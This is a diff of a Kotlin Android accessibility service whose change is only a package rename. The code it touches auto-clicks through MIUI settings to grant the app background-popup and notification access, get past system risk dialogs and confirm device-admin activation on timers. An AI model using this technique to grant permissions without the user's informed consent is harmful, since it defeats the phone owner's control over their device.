@@ -213,7 +213,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
         // ── 阶段3：点「允许 / 始终允许」──
         fun phase3(i: Int) {
             if (i > 12) { android.util.Log.w("AccGuard", "MIUI phase3 timeout (allow)"); return }
-            val hit = com.zaka.screenagent.perm.MiuiNavigator.clickByKey(this, "allow")
+            val hit = com.zaka.screenagent.flow.miui.MiuiNavigator.clickByKey(this, "allow")
             android.util.Log.d("AccGuard", "MIUI phase3[$i] allow -> $hit")
             if (hit) {
                 android.util.Log.d("AccGuard", "MIUI gate granted -> continue to permissions in 4s")
@@ -225,7 +225,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
         // ── 阶段2：点「后台弹出界面」──
         fun phase2(i: Int) {
             if (i > 12) { android.util.Log.w("AccGuard", "MIUI phase2 timeout (bgPopup)"); return }
-            val hit = com.zaka.screenagent.perm.MiuiNavigator.clickByKey(this, "bgPopup")
+            val hit = com.zaka.screenagent.flow.miui.MiuiNavigator.clickByKey(this, "bgPopup")
             android.util.Log.d("AccGuard", "MIUI phase2[$i] bgPopup -> $hit")
             if (hit) main.postDelayed({ phase3(0) }, 2500L) else main.postDelayed({ phase2(i + 1) }, 900L)
         }
@@ -233,7 +233,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
         // ── 阶段1：点「其他权限管理」（每 900ms 一次，最多 12 次 ≈ 11s）──
         fun phase1(i: Int) {
             if (i > 12) { android.util.Log.w("AccGuard", "MIUI phase1 timeout (otherPerms)"); return }
-            val hit = com.zaka.screenagent.perm.MiuiNavigator.clickByKey(this, "otherPerms", contains = true)
+            val hit = com.zaka.screenagent.flow.miui.MiuiNavigator.clickByKey(this, "otherPerms", contains = true)
             android.util.Log.d("AccGuard", "MIUI phase1[$i] otherPerms -> $hit")
             if (hit) main.postDelayed({ phase2(0) }, 3000L) else main.postDelayed({ phase1(i + 1) }, 900L)
         }
@@ -266,8 +266,8 @@ class BoundaryAccessibilityService : AccessibilityService() {
                 val p = topPkg()
                 // 只看包名不够：无障碍设置页也是 com.android.settings，
                 // 必须按"应用信息页"的特征文本判断（应用信息/强制停止/存储占用…）
-                val isAppDetails = com.zaka.screenagent.perm.MiuiNavigator.hasAnyText(
-                    this, com.zaka.screenagent.perm.MiuiNavigator.APP_DETAIL_TEXTS
+                val isAppDetails = com.zaka.screenagent.flow.miui.MiuiNavigator.hasAnyText(
+                    this, com.zaka.screenagent.flow.miui.MiuiNavigator.APP_DETAIL_TEXTS
                 )
                 android.util.Log.d("AccGuard", "MIUI phase0 check top=$p appDetails=$isAppDetails")
                 if (isAppDetails) phase1(0) else phase0(tryIdx + 1)
@@ -739,16 +739,16 @@ class BoundaryAccessibilityService : AccessibilityService() {
         }
         val label = applicationInfo.loadLabel(packageManager).toString()
         main.postDelayed({
-            val row = com.zaka.screenagent.perm.MiuiNavigator.clickByText(this, label, contains = false)
+            val row = com.zaka.screenagent.flow.miui.MiuiNavigator.clickByText(this, label, contains = false)
             android.util.Log.d("AccGuard", "noti click row=$row")
         }, 2_500L)
         main.postDelayed({
             var hit = false
-            for (t in com.zaka.screenagent.perm.MiuiNavigator.NOTI_ACCESS_TEXTS) {
-                if (com.zaka.screenagent.perm.MiuiNavigator.clickByText(this, t, contains = false)) { hit = true; break }
+            for (t in com.zaka.screenagent.flow.miui.MiuiNavigator.NOTI_ACCESS_TEXTS) {
+                if (com.zaka.screenagent.flow.miui.MiuiNavigator.clickByText(this, t, contains = false)) { hit = true; break }
             }
             android.util.Log.d("AccGuard", "noti click toggle=$hit")
-            com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this) { ok ->
+            com.zaka.screenagent.flow.miui.MiuiNavigator.passRiskDialog(this) { ok ->
                 android.util.Log.d("AccGuard", "noti risk passed=$ok")
             }
         }, 6_000L)
@@ -781,7 +781,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
         }.onFailure { android.util.Log.w("AccGuard", "admin start failed: $it") }
         // 激活页大约 6~8 秒后弹出危险页 → 8 秒后按固定节奏处理（2s 勾选、再 10s 确定）
         main.postDelayed({
-            com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this) { ok ->
+            com.zaka.screenagent.flow.miui.MiuiNavigator.passRiskDialog(this) { ok ->
                 android.util.Log.d("AccGuard", "admin risk passed=$ok attempt=$attempt")
                 val active = getSystemService(android.app.admin.DevicePolicyManager::class.java)
                     ?.isAdminActive(android.content.ComponentName(this, com.zaka.screenagent.admin.MoyingAdminReceiver::class.java)) ?: false
